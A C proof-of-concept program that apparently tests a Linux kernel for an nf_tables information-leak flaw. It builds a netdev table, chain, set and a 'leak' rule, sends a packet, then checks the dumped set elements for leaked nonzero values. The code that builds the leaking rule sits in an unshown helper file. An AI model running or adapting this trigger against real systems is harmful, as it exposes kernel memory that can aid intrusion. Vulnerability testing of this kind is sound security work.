#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>	/* for offsetof */
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/set.h>

#include <net/if.h>
#include <linux/if_packet.h>
#include <fcntl.h>
#include <limits.h>
#include "helpers.h"

int read_file(char *path)
{
	char buffer[1024];
	char *endptr;
	FILE *file = fopen(path, "r");
	
	if (file == NULL) {
		perror("open error");
		return 1;
	}
	
	while (fgets(buffer, sizeof(buffer), file) != NULL) {
		long num = strtol(buffer, &endptr, 16);
		if (num != 0x0)
			return 0;
	}
	return 1;
}


int main()
{
	char *table_name = "poc_table";
	char *chain_name = "poc_chain";
	char *set_name = "poc_set";
	char *dev_name = "eth32";
	struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);
	
	/* 1. create table */
	printf("[1] create table\n");
	int seq = time(NULL);
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0 ) {
		perror("[-] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	if (create_table(nl, table_name, NFPROTO_NETDEV, &seq, NULL))
	{
		perror("[-] create table");
		exit(-1);
	}
	
	/* 2. create chain */
	printf("[2] create chain\n");
	struct unft_base_chain_param up;
	up.hook_num = NF_NETDEV_INGRESS;
	up.prio = INT_MIN;
	if (create_chain(nl, table_name, chain_name,  NFPROTO_NETDEV, &up, &seq, NULL, dev_name))
	{
		perror("[-] create chain");
		exit(-1);
	}
	
	printf("[3] create set\n");
	if (create_set(nl, table_name, set_name, NFPROTO_NETDEV, &seq, NULL))
	{
		perror("[-] create set");
		exit(-1);
	}
	
	printf("[4] create rule\n");
	if(leak_rule(nl, table_name, chain_name, set_name, NFPROTO_NETDEV, NULL, &seq))
	{
		perror("[-] create rule\n");
		exit(-1);
	}
	
	printf("[5] send packet\n");
	if (send_packet())
	{
		perror("[-] send packet\n");
		exit(-1);
	}
	system("nft list map netdev poc_table poc_set | grep elements | grep -o \'0x[0-9a-fA-F]\\+\' > output.txt");
	if (!read_file("./output.txt"))
		printf("Discover vulnerabilities!\n");
	else
		printf("No vulnerabilities found\n");
	
	
}
